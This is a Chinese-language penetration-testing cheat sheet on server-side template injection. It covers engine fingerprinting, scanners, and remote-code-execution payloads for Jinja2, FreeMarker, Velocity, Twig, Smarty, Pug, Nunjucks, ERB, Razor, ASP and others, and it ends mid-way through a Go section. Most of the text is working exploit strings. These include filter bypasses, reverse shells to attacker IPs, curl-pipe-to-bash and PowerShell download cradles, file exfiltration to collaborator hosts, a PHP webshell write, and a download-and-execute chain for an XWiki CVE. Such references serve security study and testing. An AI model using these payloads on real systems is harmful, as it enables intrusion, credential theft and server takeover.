---
attack_surface: [注入类, 编码/序列化滥用]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - 各语言模板引擎基础语法
  - HTTP 请求/响应分析
  - Python/Java/PHP/NodeJS 基础
related_techniques:
  - xss-cross-site-scripting
  - command-injection
  - file-inclusion
  - deserialization
  - sandbox-escape
difficulty: 高级
tools:
  - TInjA
  - SSTImap
  - Tplmap
  - Fenjing
  - ssti.txt (fuzz wordlist)
---

# SSTI (Server Side Template Injection) — 服务端模板注入

> 关联文档：[Jinja2 Deep Dive](./Jinja2%20Deep%20Dive.md) · [EL Expression Language](./EL%20Expression%20Language.md) · [CSTI](../Client%20Side%20Template%20Injection/README.md) · [Command Injection](../Command%20Injection/README.md) · [SSRF](../SSRF/README.md) · [File Inclusion](../File%20Inclusion-Path%20Traversal/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 SSTI

Server-Side Template Injection（SSTI）发生在攻击者能将恶意代码注入服务端模板并在服务端执行时。模板引擎在渲染时将用户输入当作模板指令处理，而非纯文本。

**典型漏洞代码（Jinja2/Flask）**：

```python
# 危险：用户输入直接传给 render_template_string
output = template.render(name=request.args.get('name'))

# 攻击
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

## 1.2 漏洞根因

模板引擎的设计目的是将动态数据与静态模板合并。当开发者将**用户输入直接拼入模板字符串**（而非作为模板变量传入），引擎无法区分"用户数据"与"模板指令"。

```
安全方式: template.render(user_input = data)   → 输入被转义
危险方式: template.render("Hello " + user_input) → 输入被当作模板代码执行
```

## 1.3 前提条件

- 服务端使用模板引擎渲染页面
- 用户输入被直接嵌入模板字符串（非数据绑定）
- 模板引擎支持代码执行类语法（大多数都支持）

## 1.4 SSTI 与 CSTI 的区别

| 维度 | SSTI (服务端) | CSTI (客户端) |
|------|-------------|-------------|
| 执行位置 | Web 服务器 | 浏览器 |
| 影响 | RCE、文件读取、SSRF | XSS、DOM 操纵 |
| 涉及技术 | Jinja2/FreeMarker/Velocity/Twig... | Vue/Angular/React 模板 |
| 检测工具 | TInjA/SSTImap/Tplmap | DOM Invader |

---

# 0x02 检测与识别

## 2.1 初步 Fuzz

在用户输入点注入特殊字符序列，观察响应差异：

```
${{<%[%'"}}%\
```

**漏洞指示器**：
- 抛出错误，可能暴露模板引擎类型
- Payload 从响应中消失或部分被处理
- 数学表达式被计算（`{{7*7}}` → `49`）
- **Plaintext Context**：检查服务端是否计算模板表达式（如 `{{7*7}}` → `49`）
- **Code Context**：输入在模板语句内部（如 `<a title="{{user_input}}">`）。先验证无 XSS，再通过 `}}<tag>` 打破语句边界注入 HTML 标签，确认模板解析器存在

## 2.2 模板引擎识别 — 决策树

以下识别流程基于注入特定 payload 后的服务端响应行为（提取自 PortSwigger/Medium 研究）：

### 顶层分支

```
1. {{7*7}} 被计算 → 进入 Jinja2/Twig/Nunjucks 分支
2. ${7*7} 被计算 → 进入 Java 引擎分支 (FreeMarker/Velocity/Spring)
3. <%= 7*7 %> 被计算 → 进入 Ruby/ASP/Perl 分支
4. #{7*7} 被计算 → 进入 Java 表达式语言分支 (EL/Pug)
5. @(7*7) 被计算 → Razor (.NET)
6. {{7*7}} 原样返回 → 可能是 Jinja2 sandbox 或 Handlebars
7. 错误/无输出 → ...
```

### Java 引擎识别链

```
${7*7} = 49?
├─ {{7*7}} = {{7*7}} → FreeMarker (语法: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")})
├─ #{7*7} = 49 → Velocity (语法: #set($X="Velo")#set($Y="city")$X$Y → "Velocity")
├─ ${{7*7}} = 49 → EL/Jinjava
├─ *{7*7} = 49 → Spring Framework
└─ [[${7*7}]] = 49 → Thymeleaf (内联表达式)

Freemarker OR Groovy?
├─ ${NUMBER?lower_abc} → Freemarker
└─ ${((char)NUMBER).toString()} → Groovy

Mako OR Chameleon OR Cheetah?
├─ <%doc ... </%doc> 标签 → Mako
└─ <?python ?> 标签 → Chameleon
```

### Python 引擎识别链

```
{{7*7}} = 49? (Jinja2/Tornado/Bottle/Django)
├─ {{|reverse}} filter 有效?
│   ├─ {{|wordcount}} filter 有效? → Nunjucks (NodeJS)
│   └─ 无效 → Twig (PHP)
├─ {{-Comment-}} → Blade (PHP/Laravel)
├─ {{"<h1>Django OR Jinja2</h1>"|striptags}} filter 有效?
│   ├─ {{ Jinja2.Django }} 可用? → Django
│   └─ 不可用 → Jinja2
└─ {% comment %} 标签可用? → Tornado / Bottle
```

### NodeJS 引擎识别链

```
D{{="O"}}T → DOT
P#{XXXXXXX}ug → Pug
Thym[[${session}]]eleaf → Thymeleaf
Dus{XXXXXXX}tjs → Dustjs
Sm{"ar"}ty → Smarty
La{var $X="tt"}{$X}e → Latte (PHP)
Underscore OR <%"XXXXXXX"%> Ejs?
├─ <%="j"_%> → Ejs
└─ → Underscore
This({printf "is "})GO
├─ html encode → html/template
└─ raw → text/template
```

### Ruby 引擎识别链

```
<%= 7*7 %> = 49?
├─ HamI#{"OR"}Slim → Haml OR Slim
├─ Erb<%="OR Erubi OR"%>Erubis → ERB/Erubi/Erubis
└─ Must{{Context.lookup}}ache → Mustache

Handlebars OR Hogan OR Pystache?
└─ {{#if 0 includeZero=true}} → Handlebars
```

### PHP 引擎识别链

```
Sm{"ar"}ty → Smarty
La{var $X="tt"}{$X}e → Latte
{{7*7}} = 49? (Liquid/Blade/Twig)
├─ {{|reverse}} → Twig
├─ {{-Comment-}} → Blade
└─ → Liquid

PHP 特有:
├─ {$smarty.version} → Smarty
├─ {php}echo `id`;{/php} → Smarty (v2, v3 弃用)
└─ {{_self.env}} → Twig
```

## 2.3 各语言引擎 "DONE" 快速识别法

通过观察服务端对特定 polyglot 载荷的处理结果（产生 "DONE" 字符串），快速缩小引擎范围（提取自 0xAwali Medium 研究）：

### Java 引擎

| 引擎 | Payload | 预期输出 | 原理 |
|------|---------|---------|------|
| FreeMarker | `D${"ON"}E` | DONE | `${"ON"}` 求值 |
| Velocity | `#set($X="DO")#set($Y="NE")$X$Y` | DONE | `#set` 变量拼接 |
| Thymeleaf | `DO[[${session}]]NE` | DONE | `[[...]]` 内联表达式 |
| Groovy | `D${"ON"}E` | DONE | `${"ON"}` GString |

### PHP 引擎

| 引擎 | Payload | 预期输出 | 原理 |
|------|---------|---------|------|
| Blade | `D{{"ON"}}E` | DONE | `{{}}` 表达式求值 |
| Latte | `D{var $X="ON"}{$X}E` | DONE | `{var}` + `{$X}` 变量 |
| Mustache | `DO{{Context.lookup}}NE` | DONE | `{{...}}` 插值 |
| Twig | `D{{"ON"}}E` | DONE | `{{}}` 表达式求值 |
| Smarty | `D{"ON"}E` | DONE | `{}` 表达式求值 |

### NodeJS 引擎

| 引擎 | Payload | 预期输出 | 原理 |
|------|---------|---------|------|
| Hogan.js | `DO{{XXXXXXX}}NE` | DONE | `{{}}` 静默忽略未定义变量 |
| Pug | `DO#{XXXXXXX}NE` | DONE | `#{}` 插值解析 |
| Mustache | `DO{{Context.lookup}}NE` | DONE | `{{}}` 上下文查找 |
| Vue | `D{{"ON"}}E` | DONE | `{{}}` 模板插值 |
| Underscore | `DO<%"XXXXXXX"%>NE` | DONE | `<% %>` 执行不输出 |
| Ejs | `DO<%"XXXXXXX"%>NE` | DONE | `<% %>` 执行不输出 |

### Go / 其他

| 引擎 | Payload | 预期输出 | 原理 |
|------|---------|---------|------|
| text/template | `D{{printf "ON"}}E` | DONE | `printf` 输出拼接 |
| html/template | `D{{printf "ON"}}E` | DONE | `printf` 输出拼接 |

## 2.4 各引擎语法速查

| 引擎 | 表达式语法 | 计算测试 | RCE 确认 |
|------|-----------|---------|---------|
| Jinja2 (Python) | `{{ }}` / `{% %}` | `{{7*7}}` = 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Tornado (Python) | `{{ }}` / `{% %}` | `{{7*7}}` = 49 | `{% import os %}{{os.system('whoami')}}` |
| Mako (Python) | `${ }` / `<% %>` | `${7*7}` = 49 | `<% import os %>${os.popen('id').read()}` |
| FreeMarker (Java) | `${ }` / `#{ }` | `${7*7}` = 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set` / `$var` | `#set($x=7*7)$x` | `#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))` |
| Thymeleaf (Java) | `${ }` / `[[ ]]` | `${7*7}` = 49 | `${T(java.lang.Runtime).getRuntime().exec('calc')}` |
| Groovy (Java) | `${ }` / `#{ }` | `${7*7}` = 49 | `${((char)49).toString()}` 确认 → `@groovy.transform.ASTTest` |
| EL/OGNL (Java) | `${ }` / `#{ }` | `${7*7}` = 49 | `${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}` |
| Smarty (PHP) | `{ }` / `{$var}` | `{$smarty.version}` | `{system('ls')}` |
| Twig (PHP) | `{{ }}` / `{% %}` | `{{7*7}}` = 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Jade/Pug (NodeJS) | `#{ }` / `- var` | `#{7*7}` = 49 | `#{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}` |
| Handlebars (NodeJS) | `{{ }}` | `{{7*7}}` = `{{7*7}}` | 需链式利用 (this.constructor → require) |
| Nunjucks (NodeJS) | `{{ }}` / `{% %}` | `{{7*7}}` = 49 | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |
| ERB (Ruby) | `<%= %>` / `<% %>` | `<%= 7*7 %>` = 49 | `<%= system("whoami") %>` |
| Razor (.NET) | `@( )` | `@(2+2)` | `@System.Diagnostics.Process.Start("cmd.exe","/c whoami")` |
| ASP | `<%= %>` | `<%= 7*7 %>` = 49 | `<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>` |
| Go html/template | `{{ }}` | `{{printf "%s" "ssti"}}` = ssti | 需源码中存在危险方法 (如 `.System "ls"`) |
| Mojolicious (Perl) | `<%= %>` / `<% %>` | `<%= 7*7 %>` = 49 | `<%= perl code %>` |
| Jinjava (Java) | `{{ }}` | `{{'a'.toUpperCase()}}` = A | `{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("...")}}` |
| Pebble (Java) | `{{ }}` / `{% %}` | `{{ someString.toUPPERCASE() }}` | `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}` |
| JsRender (NodeJS) | `{{: }}` | `{{:7*7}}` = 49 | `{{:"pwnd".toString.constructor.call({},"return global.process.mainModule...")()}}` |
| LESS (CSS) | `@import` | — | `@import (inline) "http://attacker.com/evil.css"` 触发 SSRF |

---

# 0x03 自动化工具

| 工具 | 语言/平台 | 特性 |
|------|----------|------|
| [TInjA](https://github.com/Hackmanit/TInjA) | Go | 高效 SSTI+CSTI 扫描器，使用新型 polyglot 载荷 |
| [SSTImap](https://github.com/vladko312/sstimap) | Python3 | 自动检测+利用，支持 crawl 模式下全站扫描 |
| [Tplmap](https://github.com/epinna/tplmap) | Python2 | 经典模板注入利用框架，支持 --os-shell |
| [Template Injection Table](https://github.com/Hackmanit/template-injection-table) | Web | 44 种模板引擎交互式 polyglot 载荷对照表 |
| [Fenjing](https://github.com/Marven11/Fenjing) | Python | Jinja2 WAF 绕过专精，自动检测过滤器并生成 bypass payload |

### 使用示例

```bash
# TInjA — URL 参数扫描
tinja url -u "http://example.com/?name=test" -H "Cookie: session=xxx"

# SSTImap — 全站扫描 + shell
python3 sstimap.py -u "https://example.com/page?name=John" -s
python3 sstimap.py -u "http://example.com/" --crawl 5 --forms

# Tplmap — OS Shell
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell

# Fenjing — Jinja2 WAF bypass 爆破
python -m fenjing scan --url 'http://xxx/'
python -m fenjing crack --url 'http://xxx/' --method GET --inputs name
```

---

# 0x04 Java 模板引擎 Payload

## 4.1 通用 Java Payload

```java
# 基础注入测试
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}

# 多语法变体：如果 ${...} 不可用，尝试 #{...}, *{...}, @{...}, ~{...}

# 获取系统环境变量
${T(java.lang.System).getenv()}

# 读取文件（字符码绕过过滤）
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## 4.2 FreeMarker

在线测试：[https://try.freemarker.apache.org](https://try.freemarker.apache.org)

```java
# 识别特征
{{7*7}} = {{7*7}}
${7*7} = 49
#{7*7} = 49  // legacy 语法
${7*'7'} Nothing
${foobar}

# RCE
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

# 文件读取
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

# Sandbox 绕过 (仅 FreeMarker < 2.3.30)
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

## 4.3 Velocity

```java
# RCE 方法 1
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# RCE 方法 2
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat /flag.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i in [1..$out.available()])
$out.read()
#end
```

## 4.4 Thymeleaf

```java
# 语法变体
${T(java.lang.Runtime).getRuntime().exec('calc')}           # SpringEL
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}    # OGNL

# 内联表达式 (非属性上下文)
[[${7*7}]]
[( ${T(java.lang.Runtime).getRuntime().exec('calc')} )]

# 表达式预处理（双下划线预处理）
__${path}__
#{selection.__${sel.code}__}

# 典型漏洞模板
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

## 4.5 Spring Framework

```java
# 基础 RCE
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

# 绕过过滤器 — 多语法变体
${...} / #{...} / *{...} / @{...} / ~{...}

# 字符码构造命令（绕过关键字检测）
# 使用 Python 脚本生成 cat /etc/passwd 的全字符码 payload

# Spring View Manipulation
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

## 4.6 Pebble

```java
# Pebble < 3.0.9 — 直接 RCE
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}

# Pebble >= 3.0.9 — 链式调用
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

## 4.7 Jinjava / HubSpot HuBL

```java
# 识别
{{'a'.toUpperCase()}} → 'A'
{{ request }} → com.hubspot.content.hubl.context.TemplateContextRequest@23548206

# 注意：java.lang.Runtime 和 java.lang.System 被 javax.el.BeanELResolver 阻止
# → 需改用 javax.script.ScriptEngineManager 路径

# RCE (已通过 PR#230 修复 — 禁用 getClass 方法)
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

## 4.8 Groovy

```java
# 基础 Payload
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

# 获取命令输出
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "whoami";
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".xxx.burpcollaborator.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

# 其他变体
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64,103,114,111,111,118,121,46,116,114,97,110,115,102,111,114,109,46,65,83,84,84,101,115,116,40,118,97,108,117,101,61,123,97,115,115,101,114,116,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,34,105,100,34,41,125,41,100,101,102,32,120}))
```

### CVE-2025-24893 — XWiki SolrSearch Groovy RCE

XWiki ≤ 15.10.10 通过 `Main.SolrSearch` 宏渲染未认证 RSS 搜索结果时，对 `text` 参数进行 wiki 语法求值。

**利用步骤**：

1. **指纹识别** — 访问 `/xwiki/bin/view/Main/` 查看页脚版本号
2. **触发 SSTI** — 请求以下 URL（所有字符 URL 编码，空格用 `%20`）：

```
/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22Hello%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
```

3. **执行命令**：

```java
{{groovy}}println("id".execute().text){{/groovy}}
```

`String.execute()` 直接调用 `execve()`，不支持 shell 元字符。使用下载执行模式：

```bash
"curl http://ATTACKER_IP/rev -o /dev/shm/rev".execute().text
"bash /dev/shm/rev".execute().text
```

4. **后渗透** — XWiki 数据库凭据在 `/etc/xwiki/hibernate.cfg.xml` 中。

---

# 0x05 PHP 模板引擎 Payload

## 5.1 Smarty

```php
# 信息泄露
{$smarty.version}

# RCE
{php}echo `id`;{/php}                    # v2, v3 已弃用
{system('ls')}                            # v3 兼容
{system('cat index.php')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## 5.2 Twig

```php
# 信息泄露
{{_self}}                                 # 当前应用引用
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

# 文件读取
{{'/etc/passwd'|file_excerpt(1,30)}}

# RCE
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

# 隐藏报错（自动化利用）
{{["error_reporting", "0"]|sort("ini_set")}}
```

**典型漏洞代码**：

```php
// 危险：用户输入直接拼入模板字符串
$output = $twig->render(
  'Dear ' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

// 安全：用户输入作为模板变量传入
$output = $twig->render(
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

## 5.3 Plates

Plates 使用原生 PHP 代码，不引入新语法，SSTI 风险较低但不当使用仍可被利用：

```php
// 控制器
$templates = new League\Plates\Engine('/path/to/templates');
echo $templates->render('profile', ['name' => 'Jonathan']);

// 页面模板 — 如果 $name 来自用户且未转义
<?php $this->layout('template', ['title' => 'User Profile']) ?>
<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>  <!-- e() 会转义，安全 -->
<p>Hello, <?=$name?></p>            <!-- 无转义，危险 -->
```

## 5.4 PHPLIB / HTML_Template_PHPLIB

使用 XML 风格模板标签：`{PAGE_TITLE}`、`{AUTHOR_NAME}`。变量直接注入 HTML，无自动转义，需开发者手动安全处理。

## 5.5 patTemplate

XML 标签式模板引擎，非编译型：

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

# 0x06 NodeJS 模板引擎 Payload

## 6.1 Jade/Pug

```javascript
# 基础 RCE
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

# 反弹 Shell
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}
```

## 6.2 Handlebars

```javascript
# 特征识别
= Error
${7*7} = ${7*7}
Nothing

# 路径遍历 (LFI)
curl -X 'POST' -H 'Content-Type: application/json' \
  --data-binary '{"profile":{"layout": "./../routes/index.js"}}' \
  'http://ctf.shoebpatel.com:9090/'

# RCE (链式利用 this.constructor)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 6.3 JsRender

```javascript
# 客户端 XSS
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}

# 服务端 RCE
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

## 6.4 NUNJUCKS

```javascript
# 识别
{{7*7}} = 49
{{foo}} = No output              // 不存在变量 → 空输出
#{7*7} = #{7*7}                  // 不解析 #{} 语法
{{console.log(1)}} = Error

# RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}

{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```

## 6.5 NodeJS 沙箱逃逸 (vm2 / isolated-vm)

某些工作流构建器在 Node 沙箱中执行用户表达式，但上下文仍暴露 `this.process.mainModule.require`：

```javascript
={{ (function() {
  const require = this.process.mainModule.require;
  const execSync = require("child_process").execSync;
  return execSync("id").toString();
})() }}
```

---

# 0x07 Python 模板引擎 Payload

## 7.1 Jinja2

**识别特征**：
- `{{7*7}}` = 49（非沙箱）或 Error（沙箱/严格模式）
- `${7*7}` = `${7*7}`（不解析 `${}` 语法）
- `{{4*4}}[[5*5]]` = 16[[5*5]]（`[[]]` 不被当作标签）
- `{{7*'7'}}` = 7777777
- `{{foobar}}` — 无输出（不存在变量）

```python
# 信息收集
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
<div data-gb-custom-block data-tag="debug"></div>

{% debug %}

# RCE（不依赖 __builtins__）
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# 最短版本
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 通过 lipsum (默认可用 global)
{{ lipsum.__globals__['os'].popen('id').read() }}

# 无 {{ 和 }} 绕过
{% with a = lipsum.__globals__['os'].popen('id').read() %}{{ a }}{% endwith %}
{% print(lipsum.__globals__['os'].popen('id').read()) %}

# 无下标盲扫
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
  {% endif %}
{% endfor %}

# 通过 GET 参数传命令
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}
  {% endif %}
{% endfor %}

# 写入恶意配置文件 → 加载 → RCE
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

**Jinja2 过滤器绕过**：

```python
# 无引号/下划线/方括号
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']                    # hex 编码
request|attr("__class__")                            # attr filter
request|attr(["_"*2, "class", "_"*2]|join)           # join 拼接
request|attr(request.args.c)                          # 从 GET 参数取值
request|attr(request.headers.c)                       # 从 Header 取值
request|attr(request.query_string[2:16].decode()      # query string 切片

# 无 {{ . [ ] }} _ 的完全绕过
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}

# HTML 编码绕过 (safe filter)
{{'<script>alert(1);</script>'|safe}}
```

## 7.2 Tornado

```python
{% import os %}
{{os.system('whoami')}}
{{os.system('whoami')}}
```

## 7.3 Mako

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

# 0x08 其他语言模板引擎 Payload

## 8.1 Ruby — ERB

```ruby
# 识别 — ERB 仅响应 <%= %> 语法
{{7*7}} = {{7*7}}       # 不解析 {{}}
${7*7} = ${7*7}         # 不解析 ${}
<%= 7*7 %> = 49          # 仅此语法被计算
<%= foobar %> = Error

# RCE
<%= system("whoami") %>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>

# 文件读取
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
```

## 8.2 Ruby — Slim

```ruby
{ 7 * 7 }
{ %x|env| }
```

## 8.3 .NET — Razor

```csharp
# 识别
@(2+2)       // 被计算
@()          // 被计算
@{}          // ERROR

# RCE
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc <Base64_Payload>");

# 测试环境
# https://github.com/cnotin/RazorVulnerableApp
```

## 8.4 .NET — 反射绕过黑名单

```csharp
// 从文件系统加载 DLL
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?"))}

// 从 Base64 直接加载 DLL
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("Load", [typeof(byte[])]).Invoke(null, [Convert.FromBase64String("Base64EncodedDll")])}

// 完整命令执行
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c ""whoami""".Split(","))}
```

## 8.5 ASP (Classic)

```xml
# 识别
<%= 7*7 %> = 49
<%= "foo" %> = foo

# RCE
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```

## 8.6 Go — html/template 与 text/template

```go
# 特征识别
{{ . }}                     // 暴露数据结构
{{printf "%s" "ssti" }}     // 输出 "ssti"
